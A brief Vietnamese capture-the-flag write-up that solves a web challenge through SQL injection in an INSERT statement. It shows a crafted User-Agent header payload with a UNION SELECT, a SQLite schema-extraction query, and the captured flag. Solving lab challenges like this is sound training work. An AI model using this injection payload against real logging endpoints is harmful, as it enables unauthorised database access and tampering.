= Trang web có dạng:

<img width="1899" height="1032" alt="image" src="https://github.com/user-attachments/assets/ebc037f4-953b-44f6-93e6-a740c646299c" />

= Đây là dạng `SQL Injection trong câu lệnh INSERT`, thường dạng này sẽ đánh vào `User-Agent`:

= Dạng như này:
<img width="511" height="261" alt="image" src="https://github.com/user-attachments/assets/40a0a0b3-c20b-49e4-bbf1-1a0fbfd2b5e4" />

= Vì trang web của chúng ta có các trường như: `IP`, `User-Agent`, `Referer`, `URL`, `Cookie`, `Timestamp` nên trong CSDL sẽ có

```
INSERT INTO logger (ip, user_agent, referer, url, cookie, timestamp)
VALUES('x.x.x.x','Firefox','None','http://...','None','2025-09-11 14:40:43.965626')
```

= Chèn giá trị vào user_agent nên chúng ta sẽ không chèn được trường ip mà chỉ chèn được các trường `user_agent, referer, url, cookie, timestamp`

```
User-Agent: Mozilla/5.0', 'None', 'http://baby-logger-middleware-a3fa8f5a.dailycookie.cloud/', 'None', '2025-09-11 22:03:11.729883') UNION SELECT 1,2,3,4,5,6 --#
```

= Sau khi chèn xong ta thấy trả về kết quả, chúng ta chắc chắn là chỉ có 6 cột. 
<img width="928" height="918" alt="image" src="https://github.com/user-attachments/assets/ad6a0631-b6ba-42de-86ac-13cb95b85ca6" />

= Trang dùng SQLite, nên giờ phải trích xuất dữ liệu bằng SQLIte:

```
SELECT sql FROM sqlite_schema
```

<img width="1428" height="587" alt="image" src="https://github.com/user-attachments/assets/8940efdb-bd82-41aa-ab95-381109d5fcc3" />

= Chèn thêm mỗi cái `HACKER WAS HERE` vào 'id_address' là được:
<img width="878" height="152" alt="image" src="https://github.com/user-attachments/assets/0a02c9d7-2591-409c-bbfd-d36e696fce12" />

- Flag:

`
CHH{SQLi_CAn_chANGE_datA_8da929b69ae44ef912dcf8d725920c8a}
`
